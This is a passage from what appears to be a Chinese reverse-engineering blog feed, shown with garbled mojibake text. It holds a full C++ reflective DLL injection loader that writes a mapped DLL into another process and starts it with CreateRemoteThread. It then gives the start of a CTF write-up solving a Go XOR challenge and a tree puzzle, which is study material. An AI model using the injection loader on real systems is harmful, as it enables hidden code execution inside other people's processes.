class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ReflectLoader.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectLoader</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">HANDLE hTargetProcess;</span><br><span class="line">LPVOID remoteMem;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* targetPath;</span><br><span class="line">std::unique_ptr&lt;BYTE[]&gt; fileBase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER dosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeader;</span><br><span class="line">PIMAGE_FILE_HEADER fileHeader;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER optionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> memSize;</span><br><span class="line"><span class="type">size_t</span> memHeaderSize;</span><br><span class="line"><span class="type">size_t</span> sectionAlignment;</span><br><span class="line">DWORD64 imageBase;</span><br><span class="line"></span><br><span class="line">BYTE flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">ReflectLoader</span>(DWORD dwPid, <span class="type">const</span> <span class="type">char</span>* dllPath) &#123;</span><br><span class="line">hTargetProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">fileBase = <span class="built_in">mapToMemory</span>(dllPath);</span><br><span class="line"><span class="built_in">loadPEstruct</span>(fileBase.<span class="built_in">get</span>());</span><br><span class="line">remoteMem = <span class="built_in">VirtualAllocEx</span>(hTargetProcess, <span class="literal">NULL</span>, memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">run</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* expFuncName)</span> </span>&#123;</span><br><span class="line">LPVOID memBase = <span class="built_in">VirtualAllocEx</span>(<span class="built_in">GetCurrentProcess</span>(), remoteMem, memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!memBase) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">makeHeadandSectionMap</span>(memBase, fileBase.<span class="built_in">get</span>());</span><br><span class="line"><span class="built_in">repareReloc</span>(memBase);</span><br><span class="line"><span class="built_in">repareIAT</span>(memBase);</span><br><span class="line"><span class="built_in">setImageBase</span>(memBase);</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> bytesWritten;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hTargetProcess, remoteMem, memBase, memSize, &amp;bytesWritten);</span><br><span class="line"><span class="keyword">if</span> (bytesWritten != memSize) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;å†™å…¥ç›®æ ‡è¿›ç¨‹å¤±è´¥\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPVOID targetFunc = <span class="built_in">getExplor</span>(memBase, expFuncName);</span><br><span class="line"><span class="built_in">CreateRemoteThread</span>(hTargetProcess,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">(LPTHREAD_START_ROUTINE)targetFunc,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">mapToMemory</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filePath)</span> </span>&#123;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="type">errno_t</span> err = <span class="built_in">fopen_s</span>(&amp;file, filePath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="type">size_t</span> fileSize = <span class="built_in">ftell</span>(file);</span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">fileData</span><span class="params">(<span class="keyword">new</span> BYTE[fileSize])</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!fileData) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fread</span>(fileData.<span class="built_in">get</span>(), <span class="number">1</span>, fileSize, file);</span><br><span class="line"><span class="built_in">fclose</span>(file);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;æˆåŠŸç”³è¯·å†…å­˜: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(fileData.<span class="built_in">get</span>()));</span><br><span class="line"><span class="keyword">return</span> fileData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">loadPEstruct</span><span class="params">(BYTE* rawdata)</span> </span>&#123;</span><br><span class="line">dosHeader = (PIMAGE_DOS_HEADER)rawdata;</span><br><span class="line">ntHeader = (PIMAGE_NT_HEADERS)(rawdata + dosHeader-&gt;e_lfanew);</span><br><span class="line">fileHeader = &amp;(ntHeader-&gt;FileHeader);</span><br><span class="line">optionalHeader = &amp;(ntHeader-&gt;OptionalHeader);</span><br><span class="line"></span><br><span class="line">imageBase = optionalHeader-&gt;ImageBase;</span><br><span class="line">memSize = optionalHeader-&gt;SizeOfImage;</span><br><span class="line">memHeaderSize = optionalHeader-&gt;SizeOfHeaders;</span><br><span class="line">sectionAlignment = optionalHeader-&gt;SectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">makeHeadandSectionMap</span><span class="params">(LPVOID memBase, <span class="type">const</span> BYTE* fileBase)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------å¼€å§‹æ˜ å°„èŠ‚åŒº--------\n&quot;</span>);</span><br><span class="line"><span class="built_in">RtlMoveMemory</span>(memBase, fileBase, memHeaderSize);</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER sectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(ntHeader);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fileHeader-&gt;NumberOfSections; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (sectionHeader[i].VirtualAddress == <span class="number">0</span> &amp;&amp; sectionHeader[i].SizeOfRawData == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID srcMem = (LPVOID)(fileBase + sectionHeader[i].PointerToRawData);</span><br><span class="line">LPVOID dstMem = (BYTE*)memBase + sectionHeader[i].VirtualAddress;</span><br><span class="line"><span class="type">size_t</span> sizeOfRawData = sectionHeader[i].SizeOfRawData;</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(dstMem, srcMem, sizeOfRawData);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - èŠ‚åŒº%d: %s, æ˜ å°„åˆ°å†…å­˜ 0x%llX\n&quot;</span>, i, sectionHeader[i].Name, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(dstMem));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------æ˜ å°„èŠ‚åŒºç»“æŸ--------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareReloc</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------å¼€å§‹ä¿®å¤é‡å®šä½è¡¨-------\n&quot;</span>);</span><br><span class="line">PIMAGE_BASE_RELOCATION relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)memBase + optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"><span class="type">size_t</span> delta = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase) - optionalHeader-&gt;ImageBase;</span><br><span class="line"><span class="keyword">if</span> (relTable == <span class="literal">nullptr</span> || delta == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (relTable-&gt;SizeOfBlock != <span class="number">0</span> &amp;&amp; relTable-&gt;VirtualAddress != <span class="number">0</span>) &#123;</span><br><span class="line">WORD* pRdata = (WORD*)((BYTE*)relTable + <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="type">size_t</span> dataNum = (relTable-&gt;SizeOfBlock - <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="built_in">sizeof</span>(WORD);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - è¡¨%d:\n&quot;</span>, j);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dataNum; i++) &#123;</span><br><span class="line">DWORD type = pRdata[i] &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="keyword">if</span> (type == IMAGE_REL_BASED_DIR64) &#123;</span><br><span class="line">DWORD64* targetAddress = (DWORD64*)((BYTE*)memBase + relTable-&gt;VirtualAddress + (pRdata[i] &amp; <span class="number">0xFFF</span>));</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - å¯¹åº”åœ°å€: 0x%llX æ•°æ®: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(targetAddress), *targetAddress);</span><br><span class="line">*targetAddress += delta;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   -&gt; 0x%llX  delta: 0x%llX\n&quot;</span>, *targetAddress, delta);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)relTable + relTable-&gt;SizeOfBlock);</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------ä¿®å¤é‡å®šä½è¡¨ç»“æŸ-------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareIAT</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------å¼€å§‹ä¿®å¤IAT--------\n&quot;</span>);</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)memBase + optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line"><span class="keyword">while</span> (importDesc-&gt;OriginalFirstThunk) &#123;</span><br><span class="line"><span class="type">char</span>* Dllname = (<span class="type">char</span>*)((BYTE*)memBase + importDesc-&gt;Name);</span><br><span class="line">HMODULE hDll = <span class="built_in">GetModuleHandleA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - åŠ è½½DLL:%s\n&quot;</span>, Dllname);</span><br><span class="line">hDll = <span class="built_in">LoadLibraryA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - åŠ è½½DLLå¤±è´¥,å¯¼å…¥å‡½æ•°ç»ˆæ­¢\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - DLLå·²å­˜åœ¨:%s\n&quot;</span>, Dllname);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_THUNK_DATA INT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;OriginalFirstThunk);</span><br><span class="line">PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; INT[i].u1.AddressOfData; i++) &#123;</span><br><span class="line">DWORD64 pFunc = <span class="literal">NULL</span>;</span><br><span class="line">DWORD64 targetFunc = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;((BYTE*)memBase + INT[i].u1.AddressOfData);</span><br><span class="line"><span class="keyword">if</span> (targetFunc &amp; IMAGE_ORDINAL_FLAG) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - ä»¥åºå·:%d å¯¼å…¥å‡½æ•°\n&quot;</span>, <span class="built_in">IMAGE_ORDINAL</span>(targetFunc));</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, <span class="built_in">MAKEINTRESOURCEA</span>(<span class="built_in">IMAGE_ORDINAL</span>(targetFunc)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - ä»¥åç§°:%s å¯¼å…¥å‡½æ•°\n&quot;</span>, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pFunc) &#123;</span><br><span class="line">IAT[i].u1.Function = pFunc;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - å‡½æ•°å¯¼å…¥æˆåŠŸ\n   - ç›®çš„åœ°å€: 0x%llX\n&quot;</span>, pFunc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - å‡½æ•°å¯¼å…¥å¤±è´¥\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">importDesc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------ä¿®å¤IATç»“æŸ--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">setImageBase</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line">IMAGE_DOS_HEADER* dosHeader = (PIMAGE_DOS_HEADER)memBase;</span><br><span class="line">IMAGE_NT_HEADERS* ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)memBase + dosHeader-&gt;e_lfanew);</span><br><span class="line">ntHeader-&gt;OptionalHeader.ImageBase = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------ä¿®æ­£é•œåƒåŸºåœ°å€æˆåŠŸ--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">getExplor</span><span class="params">(LPVOID memBase, <span class="type">const</span> <span class="type">char</span>* funcName)</span> </span>&#123;</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)memBase + (optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));</span><br><span class="line">DWORD* addrOfNames = (DWORD*)((BYTE*)memBase + exp-&gt;AddressOfNames);</span><br><span class="line">DWORD dwNumOfName = exp-&gt;NumberOfNames;</span><br><span class="line"><span class="type">char</span>* pFuncName;</span><br><span class="line">DWORD* addrOfFunc = (DWORD*)((BYTE*)memBase + exp-&gt;AddressOfFunctions);</span><br><span class="line">DWORD* addrOfNameofNameOrdinals = (DWORD*)((BYTE*)memBase + exp-&gt;AddressOfNameOrdinals);</span><br><span class="line">LPVOID Func = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwNumOfName; i++)</span><br><span class="line">&#123;</span><br><span class="line">pFuncName = (<span class="type">char</span>*)((BYTE*)memBase + addrOfNames[i]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">lstrcmpA</span>(pFuncName, funcName)) &#123;</span><br><span class="line">WORD hint = addrOfNameofNameOrdinals[i];</span><br><span class="line">Func = (LPVOID)((BYTE*)memBase + addrOfFunc[hint]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Func == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;æŸ¥æ‰¾å¯¼å‡ºå‡½æ•°å¤±è´¥\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Func;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> DLLæ³¨å…¥ </category>
          
          <category> shellcodeæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DLLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¥šæ…§æ¯2024-re-wp</title>
      <link href="/posts/2dd40b61.html"/>
      <url>/posts/2dd40b61.html</url>
      
        <content type="html"><![CDATA[<p>éš¾å¾—é‡åˆ°ä¸€ä¸ªç®€å•çš„æ¯”èµ›QAQ</p><h2 id="go-bytes">go_bytes</h2><p>æ‰“å¼€åæ‰¾åˆ°mainå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥çœ‹åˆ°ä¸¤ä¸ª40é•¿åº¦çš„forå¾ªç¯ï¼Œç¬¬äºŒä¸ªç›´æ¥æ¯”è¾ƒäº†</p><p>ä¸¤æ®µåˆ†åˆ«æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">40</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)ptr &lt;= i )</span><br><span class="line">      runtime_panicIndex(i, ptr, ptr);</span><br><span class="line">    v8 = v6;</span><br><span class="line">    v9 = *(_BYTE *)(v6 + i);</span><br><span class="line">    v10 = i</span><br><span class="line">        - <span class="number">40</span> * ((__int64)(((<span class="type">unsigned</span> __int128)((i + <span class="number">1</span>) * (__int128)(__int64)<span class="number">0xCCCCCCCCCCCCCCCD</span>LL) &gt;&gt; <span class="number">64</span>) + i + <span class="number">1</span>) &gt;&gt; <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)ptr &lt;= v10 + <span class="number">1</span> )</span><br><span class="line">      runtime_panicIndex(v10 + <span class="number">1</span>, ptr, ptr);</span><br><span class="line">    *(_BYTE *)(v8 + i) = (*(_BYTE *)(v10 + v8 + <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * v9);</span><br><span class="line">    v6 = v8;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>å’Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt; <span class="number">40</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)ptr &lt;= j )</span><br><span class="line">      runtime_panicIndex(j, ptr, ptr);</span><br><span class="line">    v12 = *(<span class="type">unsigned</span> __int8 *)(v6 + j);</span><br><span class="line">    main_tmp = (<span class="type">unsigned</span> __int16)(<span class="number">291</span> * main_tmp + <span class="number">1110</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v16[j] != (main_tmp ^ v12) )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = j;</span><br><span class="line">      v21[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">      v21[<span class="number">1</span>] = &amp;off_4DCF10;</span><br><span class="line">      fmt_Fprintln(&amp;go_itab__os_File_io_Writer, os_Stdout, v21, <span class="number">1LL</span>, <span class="number">1LL</span>);</span><br><span class="line">      os_Exit(<span class="number">0LL</span>);</span><br><span class="line">      v6 = v18;</span><br><span class="line">      j = v13;</span><br><span class="line">      ptr = v14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°v16ç„¶åæ±‚å‡ºv12ï¼Œåå‘ä½è¿ç®—å³å¯å¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">xor_data = <span class="number">0xDEAD</span></span><br><span class="line">last = [<span class="number">0x22B9</span>, <span class="number">0xC9F8</span>, <span class="number">0x8C89</span>, <span class="number">0xFF18</span>, <span class="number">0x1439</span>, <span class="number">0x4E0A</span>, <span class="number">0x2A8B</span>, <span class="number">0x07CB</span>, <span class="number">0xBDEB</span>, <span class="number">0xFAAB</span>, <span class="number">0x3FFB</span>, <span class="number">0x784B</span>, <span class="number">0x9F1E</span>, <span class="number">0x4FEB</span>, <span class="number">0x4D0B</span>, <span class="number">0xD08E</span>, <span class="number">0x38BB</span>, <span class="number">0xCBAE</span>, <span class="number">0xD2CE</span>, <span class="number">0x913E</span>, <span class="number">0x0A6B</span>, <span class="number">0xF03B</span>, <span class="number">0x507B</span>, <span class="number">0x398B</span>, <span class="number">0x93DE</span>, <span class="number">0x3CCE</span>, <span class="number">0x459E</span>, <span class="number">0x4ABE</span>, <span class="number">0x553E</span>, <span class="number">0x316E</span>, <span class="number">0x33BE</span>, <span class="number">0x42FE</span>, <span class="number">0xCECE</span>, <span class="number">0x4DDE</span>, <span class="number">0x982B</span>, <span class="number">0xA31B</span>, <span class="number">0x802E</span>, <span class="number">0x12EE</span>, <span class="number">0xF67A</span>, <span class="number">0xEB79</span>]</span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    xor_data = (xor_data*<span class="number">291</span>+<span class="number">1110</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">    enc.append(last[i] ^ xor_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aenc</span>(<span class="params">enc</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(enc)-<span class="number">1</span>):</span><br><span class="line">        enc[i] = enc[i+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>|((enc[i]&lt;&lt;<span class="number">4</span>)&amp;<span class="number">0xf0</span>)</span><br><span class="line">    pl(enc)</span><br><span class="line">aenc(enc)</span><br><span class="line"><span class="comment"># DSCTF&#123;faddff8cb4d711edbb2294085339ce84&#125;</span></span><br></pre></td></tr></table></figure><h2 id="bouquet">bouquet</h2><p>å·²çŸ¥äºŒå‰æ ‘ä¸­åºå’Œååºéå†ç»“æœï¼Œæ±‚å±‚åº</p><p>æ ¹æ®æ ¹æ®ååºçš„è¾“å‡ºé€ä¸ªé€’å½’æ±‚è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, val=<span class="number">0</span>, left=<span class="literal">None</span>, right=<span class="literal">None</span></span>):</span><br><span class="line">        self.val = val</span><br><span class="line">        self.left = left</span><br><span class="line">        self.right = right</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buildTree</span>(<span class="params">inorder, postorder</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> inorder <span class="keyword">or</span> <span class="keyword">not</span> postorder:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    root_val = postorder.pop()</span><br><span class="line">    root = TreeNode(root_val)</span><br><span class="line">    inorder_index = inorder.index(root_val)</span><br><span class="line">    root.right = buildTree(inorder[inorder_index+<span class="number">1</span>:], postorder)</span><br><span class="line">    root.left = buildTree(inorder[:inorder_index], postorder)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span 